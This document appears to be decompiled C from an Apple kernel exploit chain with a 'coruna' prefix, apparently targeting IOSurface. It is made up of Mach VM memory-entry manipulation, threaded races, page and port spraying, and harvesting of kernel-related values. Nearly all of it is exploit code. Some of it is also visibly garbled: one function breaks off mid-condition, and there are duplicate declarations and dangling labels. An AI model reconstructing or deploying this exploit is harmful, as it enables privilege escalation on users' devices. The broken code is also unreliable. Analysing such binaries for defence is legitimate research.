  uint64_t work;
  long cache_26;
  
  cache_26 = *(long *)k_kernel_stack_chk_guard_slot;
  cache_25 = 0;
  work = 0;
  cache_24[1] = (pthread_t)0x0;
  cache_24[0] = (pthread_t)0x0;
  cache_24[3] = (pthread_t)0x0;
  cache_24[2] = (pthread_t)0x0;
  cache_21 = (uint64_t *)0x0;
  cache_22 = 0;
  cache_20 = 0;
  type_id = (unsigned long)size;
  off = *(long *)k_kernel_vm_page_size_slot;
  err = *(int *)(handle + 0x140);
  status = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
  if ((status < 3) || (ptr = (vm_address_t *)coruna_call_mach_vm_machine_attribute_1d4f8_20f14(), (int)ptr < 6)) {
    ptr = (vm_address_t *)coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
    if ((int)ptr < 3) {
      port = 1;
    }
    else {
      ptr = (vm_address_t *)coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
      port = (int)ptr - 1;
      if (3 < port) goto fail;
    }
    addr = 200;
  }
  else {
    port = 4;
fail:
    addr = 100;
  }
  cache_23[0x4d] = 0;
  cache_23[0x4c] = 0;
  cache_23[0x4f] = 0;
  cache_23[0x4e] = 0;
  cache_23[0x49] = 0;
  cache_23[0x48] = 0;
  cache_23[0x4b] = 0;
  cache_23[0x4a] = 0;
  cache_23[0x45] = 0;
  cache_23[0x44] = 0;
  cache_23[0x47] = 0;
  cache_23[0x46] = 0;
  cache_23[0x41] = 0;
  cache_23[0x40] = 0;
  cache_23[0x43] = 0;
  cache_23[0x42] = 0;
  cache_23[0x3d] = 0;
  cache_23[0x3c] = 0;
  cache_23[0x3f] = 0;
  cache_23[0x3e] = 0;
  cache_23[0x39] = 0;
  cache_23[0x38] = 0;
  cache_23[0x3b] = 0;
  cache_23[0x3a] = 0;
  cache_23[0x35] = 0;
  cache_23[0x34] = 0;
  cache_23[0x37] = 0;
  cache_23[0x36] = 0;
  cache_23[0x31] = 0;
  cache_23[0x30] = 0;
  cache_23[0x33] = 0;
  cache_23[0x32] = 0;
  cache_23[0x2d] = 0;
  cache_23[0x2c] = 0;
  cache_23[0x2f] = 0;
  cache_23[0x2e] = 0;
  cache_23[0x29] = 0;
  cache_23[0x28] = 0;
  cache_23[0x2b] = 0;
  cache_23[0x2a] = 0;
  cache_23[0x25] = 0;
  cache_23[0x24] = 0;
  cache_23[0x27] = 0;
  cache_23[0x26] = 0;
  cache_23[0x21] = 0;
  cache_23[0x20] = 0;
  cache_23[0x23] = 0;
  cache_23[0x22] = 0;
  cache_23[0x1d] = 0;
  cache_23[0x1c] = 0;
  cache_23[0x1f] = 0;
  cache_23[0x1e] = 0;
  cache_23[0x19] = 0;
  cache_23[0x18] = 0;
  cache_23[0x1b] = 0;
  cache_23[0x1a] = 0;
  cache_23[0x15] = 0;
  cache_23[0x14] = 0;
  cache_23[0x17] = 0;
  cache_23[0x16] = 0;
  cache_23[0x11] = 0;
  cache_23[0x10] = 0;
  cache_23[0x13] = 0;
  cache_23[0x12] = 0;
  cache_23[0xd] = 0;
  cache_23[0xc] = 0;
  cache_23[0xf] = 0;
  cache_23[0xe] = 0;
  cache_23[9] = 0;
  cache_23[8] = 0;
  cache_23[0xb] = 0;
  cache_23[10] = 0;
  cache_23[5] = 0;
  cache_23[4] = 0;
  cache_23[7] = 0;
  cache_23[6] = 0;
  cache_23[1] = 0;
  cache_23[0] = 0;
  cache_23[3] = 0;
  cache_23[2] = 0;
  if (*(long *)(k_kernel_os_alloc_once_table_slot + 0x500) == -1) {
    buf = *(vm_address_t **)(k_kernel_os_alloc_once_table_slot + 0x508);
  }
  else {
    ptr = (vm_address_t *)__os_alloc_once(k_kernel_os_alloc_once_table_slot + 0x500,0x10,0);
    buf = ptr;
  }
  ptr = k_kernel_mach_task_self_slot;
  off = off * type_id;
  if ((*buf == 0) || (lv16 = buf[1], lv16 == 0)) {
    if (*(long *)((long)ctx + 0x3628) == 0) {
      host_info = 0;
      cache = 0;
      url_buf = (uint64_t *)coruna_u64_pack((url_buf), (1));
      frame = 0;
      json_buf = 0;
      region = 0;
      frame = 0;
      url_buf = 0;
      work = 0;
      plist = 0;
      stack_guard = 0;
      sa_saved = 0;
      json_buf = 0;
      tmp_buf = 0;
      sa_new = 0;
      path_buf = 0;
      plist = coruna_u64_pack((plist), (0x13));
      version = _vm_region_recurse_64
                         (*(vm_map_t *)k_kernel_mach_task_self_slot,&host_info,&cache,
                          (natural_t *)&url_buf,(vm_region_recurse_info_t)&json_buf,
                          (mach_msg_type_number_t *)&plist);
      while (ptr = (vm_address_t *)(unsigned long)version, version == 0) {
        if (1 < (uint)url_buf) break;
        if (((uint)url_buf == 1) &&
           (type_id_8 = off + *(long *)k_kernel_vm_page_size_slot * 2,
           type_id_8 <= cache && coruna_u64_pack((sa_new), (sa_saved)) == 0)) {
          *(vm_address_t *)((long)ctx + 0x3628) = host_info;
          *(unsigned long *)((long)ctx + 0x3630) = type_id_8;
          *buf = host_info;
          buf[1] = type_id_8;
          cache = type_id_8;
          goto done;
        }
        host_info = host_info + cache;
        cache = 0;
        url_buf = (uint32_t)((unsigned long)url_buf >> 0x20);
        url_buf = (uint64_t *)coruna_u64_pack((url_buf), (1));
        frame = 0;
        json_buf = 0;
        region = 0;
        frame = 0;
        url_buf = 0;
        work = 0;
        plist = 0;
        stack_guard = 0;
        sa_saved = 0;
        json_buf = 0;
        tmp_buf = 0;
        sa_new = 0;
        path_buf = 0;
        plist = (uint32_t)(plist >> 0x20);
        plist = coruna_u64_pack((plist), (0x13));
        version = _vm_region_recurse_64
                           (*(vm_map_t *)ptr,&host_info,&cache,(natural_t *)&url_buf,
                            (vm_region_recurse_info_t)&json_buf,
                            (mach_msg_type_number_t *)&plist);
      }
      size = 0;
      scratch = 0;
      type_id = (unsigned long)port;
    }
  }
  else {
    *(vm_address_t *)((long)ctx + 0x3628) = *buf;
    *(vm_address_t *)((long)ctx + 0x3630) = lv16;
  }
done:
  if ((*(long *)((long)ctx + 0x3628) != 0) && (*(long *)((long)ctx + 0x3630) != 0)) {
    handle = 0;
    size = *(vm_size_t *)((long)ctx + 0x3630);
    type_id_8 = (unsigned long)port;
    scratch = 0;
    do {
      *(uint32_t *)((long)ctx + 0x363c) = 0;
      *(uint32_t *)((long)ctx + 0x3640) = 0;
      cache_25 = 0;
      work = 0;
      if (port == 0) {
        object = 0;
      }
      else {
        object_handle = (mach_port_t *)&cache_25;
        kind = type_id_8;
        do {
          json_buf = size;
          version = _mach_make_memory_entry_64
                             (*(vm_map_t *)ptr,&json_buf,
                              *(memory_object_offset_t *)((long)ctx + 0x3628),1,object_handle,0)
          ;
          ptr = (vm_address_t *)(unsigned long)version;
          type_id = (unsigned long)port;
          object_handle = object_handle + 1;
          kind = kind - 1;
        } while (kind != 0);
        object = (mem_entry_name_port_t)cache_25;
      }
      *(mem_entry_name_port_t *)((long)ctx + 0x3638) = object;
      size_00 = *(vm_size_t *)k_kernel_vm_page_size_slot;
      version = _vm_map(*(vm_map_t *)ptr,&cache_22,size,0,1,object,0,0,1,1,
                       in_stack_fffffffffffffb70);
      ptr = (vm_address_t *)(unsigned long)version;
      type_id = (unsigned long)port;
      lv1 = size_00 + size;
      ptr = (vm_address_t *)coruna_vm_map_e0c0(&cache_21,lv1,0x1ffffff,9,0x10);
      str = cache_21;
      type_id = (unsigned long)port;
      version = _vm_copy(*(vm_map_t *)ptr,cache_22,size,(vm_address_t)cache_21);
      ptr = (vm_address_t *)(unsigned long)version;
      scratch = lv1;
      type_id = (unsigned long)port;
      version = _vm_deallocate(*(vm_map_t *)ptr,cache_22,size);
      ptr = (vm_address_t *)(unsigned long)version;
      type_id = (unsigned long)port;
      cache_22 = 0;
      cache = (long)str + size;
      version = _vm_allocate(*(vm_map_t *)ptr,&cache,size_00,0x6004000);
      ptr = (vm_address_t *)(unsigned long)version;
      type_id = (unsigned long)port;
      version = _vm_deallocate(*(vm_map_t *)ptr,cache,size_00);
      ptr = (vm_address_t *)(unsigned long)version;
      type_id = (unsigned long)port;
      plist = 0;
      url_buf = str;
      frame = 0;
      json_buf = 0;
      region = 0;
      frame = 0;
      url_buf = 0;
      work = 0;
      plist = 0;
      stack_guard = 0;
      sa_saved = 0;
      json_buf = 0;
      tmp_buf = 0;
      sa_new = 0;
      path_buf = 0;
      tmp_buf = 0x13;
      region = 0;
      version = _vm_region_recurse_64
                         (*(vm_map_t *)ptr,&url_buf,&plist,&region,
                          (vm_region_recurse_info_t)&json_buf,&tmp_buf);
      ptr = (vm_address_t *)(unsigned long)version;
      scratch = size;
      type_id = (unsigned long)port;
      status = (int)region;
      if (port != 0) {
        pp_Var24 = cache_24;
        kind = type_id_8;
        do {
          lppv14 = (void **)coruna_kernel509_via_helper_5d2c_419fc(coruna_vm_map_de28);
          version = _pthread_create(pp_Var24,(pthread_attr_t *)0x0,lppv14,ctx);
          ptr = (vm_address_t *)(unsigned long)version;
          type_id = (unsigned long)port;
          pp_Var24 = pp_Var24 + 1;
          kind = kind - 1;
        } while (kind != 0);
      }
      while (*(uint *)((long)ctx + 0x3640) != port) {
        coruna_semaphore_timedwait(handle,1000);
      }
      path_buf = size;
      version = _mach_make_memory_entry_64(*(vm_map_t *)ptr,&path_buf,0,1,&cache_20,object);
      ptr = (vm_address_t *)(unsigned long)version;
      type_id = (unsigned long)port;
      *(uint32_t *)((long)ctx + 0x363c) = 1;
      if (port != 0) {
        pp_Var24 = cache_24;
        kind = type_id_8;
        do {
          version = _pthread_join(*pp_Var24,(void **)0x0);
          ptr = (vm_address_t *)(unsigned long)version;
          type_id = (unsigned long)port;
          *pp_Var24 = (pthread_t)0x0;
          kind = kind - 1;
          pp_Var24 = pp_Var24 + 1;
        } while (kind != 0);
      }
      str = cache_21;
      sa_saved = 0;
      sa_new = cache_21;
      stack_guard = 0;
      block_ctx = (vm_address_t *)0x0;
      block_ctx = 0;
      host_info = 0;
      serial_buf = 0;
      action = 0;
      action = 0;
      serial_buf = 0;
      scratch = 0;
      host_info = 0;
      thread_attr = 0;
      bootargs = 0;
      thread_attr = 0x13;
      version = _vm_region_recurse_64
                         (*(vm_map_t *)ptr,(vm_address_t *)&sa_new,&sa_saved,&stack_guard,
                          (vm_region_recurse_info_t)&host_info,&thread_attr);
      ptr = (vm_address_t *)(unsigned long)version;
      type_id = (unsigned long)port;
      version = status + 1;
      kind = (unsigned long)version;
      type_id_9 = host_info & 0xffffffff;
      type_id = (unsigned long)port;
      if ((uint)host_info < version) {
        bootargs = 0;
        size = kind - type_id_9;
        type_id = (unsigned long)port;
        if (0xfffffffffffffffe >= type_id_8 - size) {
          addr = ((type_id_8 + type_id_9) - kind) + 1;
          lpm22 = (mach_port_name_t *)&cache_25;
          while (addr != 0) {
            version = _mach_port_deallocate(*(vm_map_t *)ptr,*lpm22);
            ptr = (vm_address_t *)(unsigned long)version;
            type_id = (unsigned long)port;
            *lpm22 = 0;
            lpm22 = lpm22 + 1;
            addr = addr - 1;
          }
        }
        break;
      }
      else {
      version = _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)str,size);
      ptr = (vm_address_t *)(unsigned long)version;
      type_id = (unsigned long)port;
      cache_21 = (uint64_t *)0x0;
      version = _mach_port_deallocate(*(ipc_space_t *)ptr,cache_20);
      ptr = (vm_address_t *)(unsigned long)version;
      type_id = (unsigned long)port;
      cache_20 = 0;
      if (port != 0) {
        lpm22 = (mach_port_name_t *)&cache_25;
        kind = type_id_8;
        do {
          version = _mach_port_deallocate(*(ipc_space_t *)ptr,*lpm22);
          ptr = (vm_address_t *)(unsigned long)version;
          type_id = (unsigned long)port;
          *lpm22 = 0;
          kind = kind - 1;
          lpm22 = lpm22 + 1;
        } while (kind != 0);
      }
      handle = handle + 1;
      }
    } while (handle != addr);
next:
    if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
      return;
    }
    ___stack_chk_fail(ptr);
  }
  size = 0;
  scratch = 0;
  type_id = (unsigned long)port;
check_ok:
  if ((type_id_8 - size) + 1 < type_id_8) {
    addr = ~type_id_9 + kind;
    data = (uint32_t *)((long)&cache_25 + ((type_id_8 + type_id_9) - kind) * 4);
    do {
      data = data + 1;
      u = *data;
      version = *(uint *)((long)ctx + 0x3620);
      *(uint *)((long)ctx + 0x3620) = version + 1;
      *(uint32_t *)((long)ctx + (unsigned long)version * 4 + 0x3520) = u;
      *data = 0;
      addr = addr + -1;
    } while (addr != 0);
  }
  if (err < 0x2258) {
    addr = 0;
    version = 0;
    buf = block_ctx;
    copy = block_ctx;
    do {
      str = (vm_address_t *)((long)cache_23 + addr + 0x80);
      tag = _vm_allocate(*(vm_map_t *)ptr,str,*(vm_size_t *)k_kernel_vm_page_size_slot,3);
      ptr = (vm_address_t *)(unsigned long)tag;
      if ((tag != 0) ||
         (ptr = (vm_address_t *)coruna_vm_region_recurse_64_df14(*str), ptr == (vm_address_t *)0x0))
      type_id = (unsigned long)port;
      type_id_8 = (unsigned long)*(uint *)(handle + 0x180);
      str = ptr;
      if (copy <= ptr) {
        str = copy;
      }
      data = ptr;
      if (ptr <= copy) {
        data = copy;
      }
      if (type_id_8 <= (unsigned long)((long)data - (long)str)) {
retry:
        if ((version != 0) || (addr == 0)) {
          version = version + 1;
          data = ptr;
          str = ptr;
          continue;
        }
nomem:
        version = _mach_port_deallocate(*(ipc_space_t *)ptr,cache_20);
        ptr = (vm_address_t *)(unsigned long)version;
        type_id = (unsigned long)port;
        addr = 0;
        cache_20 = 0;
        continue;
      }
      copy = ptr;
      if (buf <= ptr) {
        copy = buf;
      }
      data = ptr;
      if (ptr <= buf) {
        data = buf;
      }
      continue;
    } while (addr != 0x200);
  }
  else {
    addr = 0;
    version = 0;
    buf = block_ctx;
    copy = block_ctx;
    do {
      str = (vm_address_t *)((long)cache_23 + addr + 0x80);
      tag = _vm_allocate(*(vm_map_t *)ptr,str,*(vm_size_t *)k_kernel_vm_page_size_slot,3);
      ptr = (vm_address_t *)(unsigned long)tag;
      if ((tag != 0) ||
         (ptr = (vm_address_t *)coruna_vm_region_recurse_64_df14(*str), ptr == (vm_address_t *)0x0))
      type_id = (unsigned long)port;
      type_id_8 = (unsigned long)*(uint *)(handle + 0x180);
      str = ptr;
      if (buf <= ptr) {
        str = buf;
      }
      data = ptr;
      if (ptr <= buf) {
        data = buf;
      }
      if (type_id_8 <= (unsigned long)((long)data - (long)str)) {
again:
        if ((version != 0) || (addr == 0)) {
          version = version + 1;
          str = ptr;
          data = ptr;
          continue;
        }
code_r0x0000ec28:
        if (size != 0) {
          addr = *(long *)k_kernel_vm_page_size_slot;
          copy = str;
          do {
            *copy = *(uint64_t *)((long)ctx + 0x3518);
            copy = (uint64_t *)((long)copy + addr);
            type_id = type_id - 1;
          } while (type_id != 0);
        }
        *addr_2 = (long)str;
        addr_2[1] = off;
        *(uint *)(addr_2 + 4) = size;
        addr_2[2] = size;
        version = _mach_port_deallocate(*(ipc_space_t *)ptr,cache_20);
        ptr = (vm_address_t *)(unsigned long)version;
        type_id = (unsigned long)port;
        cache_20 = 0;
        ptr = (vm_address_t *)coruna_mach_make_memory_entry_dfa0(ctx,size,block_ctx,&bootargs);
        if ((int)ptr == 0) {
          *(uint32_t *)((long)addr_2 + 0x24) = bootargs;
        }
        off = 0;
        do {
          addr = *(long *)((long)cache_23 + off + 0x80);
          if (addr != 0) {
            *(long *)((long)addr_2 + off + 0xb0) = addr;
            *(uint64_t *)((long)cache_23 + off + 0x80) = 0;
          }
          off = off + 8;
        } while (off != 0x200);
        continue;
      }
      buf = ptr;
      if (copy <= ptr) {
        buf = copy;
      }
      data = ptr;
      if (ptr <= copy) {
        data = copy;
      }
      continue;
    } while (addr != 0x200);
  }
  *addr_2 = (long)str;
  addr_2[1] = 0;
  addr_2[2] = size;
  *(uint32_t *)(addr_2 + 4) = 0;
  *(mach_port_t *)((long)addr_2 + 0x24) = cache_20;
  cache_21 = (uint64_t *)0x0;
  cache_20 = 0;
cleanup:
  type_id = (unsigned long)port;
parse_ok:
  do {
    *(uint32_t *)((long)ctx + 0x363c) = 1;
    if (port != 0) {
      pp_Var24 = cache_24;
      type_id_8 = type_id;
      do {
        ptr = (vm_address_t *)0x0;
        if (*pp_Var24 != (pthread_t)0x0) {
          version = _pthread_join(*pp_Var24,(void **)0x0);
          ptr = (vm_address_t *)(unsigned long)version;
          *pp_Var24 = (pthread_t)0x0;
        }
        pp_Var24 = pp_Var24 + 1;
        type_id_8 = type_id_8 - 1;
      } while (type_id_8 != 0);
    }
    type_id_8 = 0;
    err = true;
    do {
      if (cache_23[type_id_8] != 0) {
        version = _vm_deallocate(*(vm_map_t *)ptr,cache_23[type_id_8],size);
        ptr = (vm_address_t *)(unsigned long)version;
        if (version != 0) break;
        cache_23[type_id_8] = 0;
      }
      err = type_id_8 < 0xf;
      type_id_8 = type_id_8 + 1;
    } while (type_id_8 != 0x10);
    buf = k_kernel_vm_page_size_slot;
  } while (err);
  off = 0;
  do {
    lv16 = *(vm_address_t *)((long)cache_23 + off + 0x80);
    if (lv16 != 0) {
      version = _vm_deallocate(*(vm_map_t *)ptr,lv16,*(vm_size_t *)buf);
      ptr = (vm_address_t *)(unsigned long)version;
      if (version != 0) goto parse_ok;
      *(uint64_t *)((long)cache_23 + off + 0x80) = 0;
    }
    off = off + 8;
    if (off == 0x200) {
      if (cache_21 != (uint64_t *)0x0 && scratch != 0) {
        version = _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)cache_21,scratch);
        ptr = (vm_address_t *)(unsigned long)version;
      }
      if ((cache_22 != 0) && (size != 0)) {
        version = _vm_deallocate(*(vm_map_t *)ptr,cache_22,size);
        ptr = (vm_address_t *)(unsigned long)version;
      }
      if (1 < cache_20 + 1) {
        version = _mach_port_deallocate(*(ipc_space_t *)ptr,cache_20);
        ptr = (vm_address_t *)(unsigned long)version;
      }
      if (port != 0) {
        lpm22 = (mach_port_name_t *)&cache_25;
        do {
          if (1 < *lpm22 + 1) {
            port = _mach_port_deallocate(*(ipc_space_t *)ptr,*lpm22);
            ptr = (vm_address_t *)(unsigned long)port;
          }
          lpm22 = lpm22 + 1;
          type_id = type_id - 1;
        } while (type_id != 0);
      }
      continue;
    }
  } while( true );
  while (addr = addr + 8, addr != 0x80) {
invalid:
    version = _vm_allocate(*(vm_map_t *)ptr,(vm_address_t *)((long)cache_23 + addr),size,3);
    ptr = (vm_address_t *)(unsigned long)version;
    type_id = (unsigned long)port;
  }
  addr = 0;
  do {
    ptr = (vm_address_t *)coruna_vm_region_recurse_64_df14(*(uint64_t *)((long)cache_23 + addr));
    type_id = (unsigned long)port;
    if (ptr == block_ctx) {
      copy = *(uint64_t **)((long)cache_23 + addr);
      *(uint64_t *)((long)cache_23 + addr) = 0;
      if (copy != (uint64_t *)0x0) {
        if (size != 0) {
          addr = *(long *)k_kernel_vm_page_size_slot;
          obj = copy;
          do {
            *obj = *(uint64_t *)((long)ctx + 0x3518);
            obj = (uint64_t *)((long)obj + addr);
            type_id = type_id - 1;
          } while (type_id != 0);
        }
        *addr_2 = (long)copy;
        addr_2[1] = off;
        addr_2[2] = size;
        *(uint *)(addr_2 + 4) = size;
        version = _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)str,size);
        ptr = (vm_address_t *)(unsigned long)version;
        type_id = (unsigned long)port;
        cache_21 = (uint64_t *)0x0;
        ptr = (vm_address_t *)coruna_mach_make_memory_entry_dfa0(ctx,size,block_ctx,&bootargs);
        if ((int)ptr == 0) {
          *(uint32_t *)((long)addr_2 + 0x24) = bootargs;
        }
        off = 0;
        do {
          if (*(long *)((long)cache_23 + off) != 0) {
            *(long *)((long)addr_2 + off + 0x30) = *(long *)((long)cache_23 + off);
            *(uint64_t *)((long)cache_23 + off) = 0;
          }
          off = off + 8;
        } while (off != 0x80);
        off = 0;
        do {
          addr = *(long *)((long)cache_23 + off + 0x80);
          if (addr != 0) {
            *(long *)((long)addr_2 + off + 0xb0) = addr;
            *(uint64_t *)((long)cache_23 + off + 0x80) = 0;
          }
          off = off + 8;
        } while (off != 0x200);
        continue;
      }
      break;
    }
    addr = addr + 8;
  } while (addr != 0x80);
  *addr_2 = (long)str;
  addr_2[1] = 0;
  addr_2[2] = size;
  addr_2[4] = 0;
  cache_21 = (uint64_t *)0x0;
  type_id = (unsigned long)port;
}
void coruna_pthread_attr_setdetachstate_ee74(uint64_t val,uint32_t size,uint32_t *flags_2)
{
  vm_map_t target_task;
  mach_port_name_t name;
  uint8_t *ptr;
  int err;
  void **lppv3;
  void *ptr;
  uint u;
  unsigned long size;
  long handle;
  uint32_t scratch[2824];
  vm_address_t bootargs;
  vm_size_t thread_attr;
  vm_address_t host_info;
  vm_size_t serial_buf;
  mach_port_name_t action [524];
  mach_port_name_t block_ctx;
  void *stack_guard;
  uint sa_saved;
  vm_address_t sa_new;
  vm_size_t path_buf;
  vm_address_t tmp_buf;
  vm_size_t region;
  mach_port_name_t plist [18];
  mach_port_name_t url_buf;
  uint8_t *json_buf;
  uint32_t *frame;
  uint64_t work;
  pthread_t cache;
  pthread_attr_t cache_20;
  long cache_21;
  
  cache_21 = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(scratch,0x6650);
  scratch[0] = size;
  err = _pthread_attr_init(&cache_20);
  if (err == 0) {
    err = _pthread_attr_setdetachstate(&cache_20,1);
    if (err == 0) {
      cache = (pthread_t)0x0;
      frame = scratch;
      json_buf = &k_kernel_slot_1001;
      work = val;
      lppv3 = (void **)coruna_kernel509_via_helper_5d2c_419fc(coruna_kernel509_via_dlopen_iosurface);
      err = _pthread_create(&cache,&cache_20,lppv3,&json_buf);
      if ((err == 0) && (err = _pthread_join(cache,(void **)0x0), err == 0)) {
        err = (int)json_buf;
        _pthread_attr_destroy(&cache_20);
        if (err == 0) {
          *flags_2 = 0;
        }
        goto code_r0x0000ef44;
      }
    }
    _pthread_attr_destroy(&cache_20);
  }
code_r0x0000ef44:
  ptr = k_kernel_mach_task_self_slot;
  target_task = *(vm_map_t *)k_kernel_mach_task_self_slot;
  if ((bootargs != 0) && (thread_attr != 0)) {
    _vm_deallocate(target_task,bootargs,thread_attr);
    bootargs = 0;
    thread_attr = 0;
  }
  if ((host_info != 0) && (serial_buf != 0)) {
    _vm_deallocate(*(vm_map_t *)ptr,host_info,serial_buf);
    host_info = 0;
    serial_buf = 0;
  }
  handle = 0;
  do {
    if (1 < *(mach_port_name_t *)((long)action + handle) + 1) {
      _mach_port_mod_refs(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)action + handle),1,
                          -1);
    }
    *(uint32_t *)((long)action + handle) = 0;
    handle = handle + 4;
  } while (handle != 0x400);
  handle = 0;
  do {
    if (1 < *(mach_port_name_t *)((long)plist + handle) + 1) {
      _mach_port_mod_refs(target_task,*(mach_port_name_t *)((long)plist + handle),1,-1);
      *(uint32_t *)((long)plist + handle) = 0;
    }
    handle = handle + 4;
  } while (handle != 0x40);
  if ((tmp_buf != 0) && (region != 0)) {
    _vm_deallocate(target_task,tmp_buf,region);
    tmp_buf = 0;
    region = 0;
  }
  if ((sa_new != 0) && (path_buf != 0)) {
    _vm_deallocate(target_task,sa_new,path_buf);
    sa_new = 0;
    path_buf = 0;
  }
  if (1 < block_ctx + 1) {
    _mach_port_deallocate(target_task,block_ctx);
    block_ctx = 0;
  }
  if (1 < url_buf + 1) {
    _mach_port_deallocate(target_task,url_buf);
    url_buf = 0;
  }
  if (stack_guard != (void *)0x0) {
    ptr = stack_guard;
    if (sa_saved != 0) {
      size = 0;
      u = sa_saved;
      do {
        name = *(mach_port_name_t *)((long)ptr + size * 4);
        if (1 < name + 1) {
          _mach_port_deallocate(target_task,name);
          *(uint32_t *)((long)stack_guard + size * 4) = 0;
          ptr = stack_guard;
          u = sa_saved;
        }
        size = size + 1;
      } while (size < u);
    }
    _free(ptr);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_21) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_call_pthread_attr_setdetachstate_ee74(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_pthread_attr_setdetachstate_ee74(val,3,off_4);
  return;
}
void coruna_kernel509_via_dlopen_iosurface(uint32_t *size)
{
  uint32_t u;
  
  u = coruna_dlopen_iosurface(*(uint64_t *)(size + 4),*(uint64_t *)(size + 2));
  *size = u;
  return;
}
void coruna_dlopen_iosurface(uint *size,int *flags)
{
  unsigned long *ptr;
  unsigned long *buf;
  vm_address_t *address;
  vm_prot_t permission;
  byte err;
  uint8_t *str;
  uint8_t *copy;
  mach_port_t lm6;
  mach_msg_size_t lm7;
  mach_msg_id_t lm8;
  mach_msg_size_t lm9;
  mach_msg_id_t lm10;
  bool status;
  kern_return_t lk12;
  mach_port_name_t lm13;
  int err;
  pid_t lp15;
  mach_msg_return_t lm16;
  mach_port_t lm17;
  int status;
  uint u;
  uint size;
  uint version;
  uint port;
  unsigned long tag;
  void *ptr;
  char *ptr;
  uint64_t kind;
  long handle;
  long addr;
  unsigned long type_id;
  long off;
  long *buf;
  long base;
  uint64_t type_id_8;
  uint64_t type_id_9;
  int *err;
  uint *data;
  char *buf;
  uint type_id_10;
  uint32_t *obj;
  uint *block;
  unsigned long type_id_11;
  bool flags;
  vm_address_t lv43;
  unsigned long type_id_12;
  uint32_t *entry;
  long ctx_val;
  vm_size_t lv47;
  long *str;
  unsigned long type_id_13;
  uint32_t type_id_14;
  long serial;
  uint64_t *entry_9;
  long serial_7;
  long *copy;
  uint64_t type_id_15;
  unsigned long type_id_16;
  uint16_t type_id_17;
  vm_inherit_t in_stack_ffffffffffffeeb0;
  int scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long host_info;
  uint64_t serial_buf;
  unsigned long action;
  unsigned long block_ctx;
  long stack_guard;
  unsigned long *sa_saved;
  long sa_new;
  int *path_buf;
  int *tmp_buf;
  vm_size_t region;
  mem_entry_name_port_t plist [3];
  vm_address_t url_buf;
  char *json_buf [4];
  unsigned long frame;
  vm_address_t work;
  unsigned long cache;
  uint32_t cache_20;
  unsigned long cache_21;
  unsigned long cache_22;
  char *cache_23;
  long cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  mach_msg_header_t cache_27;
  uint host_info;
  uint32_t serial_buf;
  uint32_t action;
  uint32_t block_ctx;
  unsigned long stack_guard;
  unsigned long cache_28;
  uint64_t sa_saved;
  uint64_t cache_29;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_30;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_31;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache_32;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_33;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_34;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  long cache_35;
  
  copy = k_kernel_vm_page_size_slot;
  cache_35 = *(long *)k_kernel_stack_chk_guard_slot;
  url_buf = 0;
  plist[0] = 0;
  region = *(vm_size_t *)k_kernel_vm_page_size_slot;
  tag = coruna_call_return_zero_61a8_20f50();
  *(unsigned long *)(flags + 2) = tag;
  *(uint64_t *)(flags + 0xd3a) = k_kernel_rodata_word_42fe8;
  str = k_kernel_mach_task_self_slot;
  if ((0x400000000 < tag) ||
     (lk12 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&url_buf,0x2000,1),
     if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
     ___stack_chk_fail();
     }
     return;
}
void coruna_vm_region_64(long handle,long addr_2,long off_3,uint size)
{
  unsigned long u;
  uint size;
  long handle;
  unsigned long version;
  long addr;
  long off;
  vm_address_t lv7;
  size_t ls8;
  long base;
  long *ptr;
  unsigned long port;
  unsigned long tag;
  long scratch;
  mach_port_t bootargs;
  mach_msg_type_number_t thread_attr;
  int host_info [8];
  uint16_t serial_buf;
  vm_size_t action;
  vm_address_t block_ctx;
  vm_address_t stack_guard;
  long sa_saved;
  long sa_new;
  
  sa_new = *(long *)k_kernel_stack_chk_guard_slot;
  size = 0xad022;
  base = *(long *)(handle + 0x50);
  if (base == 0) {
    size = 0xad001;
  }
  else {
    ptr = *(long **)(&k_kernel_slot_3448 + base);
    off = *(long *)(&k_kernel_slot_3458 + base);
    if (((*(long *)(off + 0x18) == ptr[2]) &&
        (scratch = *(long *)(&k_kernel_slot_3450 + base), *(long *)(off + 8) == scratch)) &&
       (*ptr == *(long *)(&k_kernel_slot_3460 + base))) {
      if (size != 0) {
        port = 0;
        handle = *(long *)k_kernel_vm_page_size_slot;
        lv7 = ptr[3] - handle;
        tag = (unsigned long)size;
        do {
          u = port + addr_2;
          version = *(unsigned long *)(handle + 0x188) & u;
          size = *(uint *)(handle + 0x180);
          thread_attr = 9;
          *(long *)(off + 8) = ptr[1];
          block_ctx = lv7;
          _madvise(*(uint64_t *)(&k_kernel_slot_2c20 + base),handle << 1,2);
          addr = ptr[1];
          handle = ptr[3];
          ls8 = tag;
          if ((unsigned long)size < version + 0x40 && version + tag <= (unsigned long)size) {
            ptr[1] = u - 0x4e;
            ptr[3] = lv7;
            size = _vm_region_64(*(vm_map_t *)k_kernel_mach_task_self_slot,&block_ctx,&action,9,
                                  host_info,&thread_attr,&bootargs);
            ptr[1] = addr;
            ptr[3] = handle;
            *(long *)(off + 8) = scratch;
            *(long *)(&k_kernel_slot_3468 + base) = *(long *)(&k_kernel_slot_3468 + base) + 1;
            if (size != 0) goto fail;
            if (1 < tag) {
              ls8 = 2;
            }
            stack_guard = coruna_cat(stack_guard,serial_buf);
          }
          else {
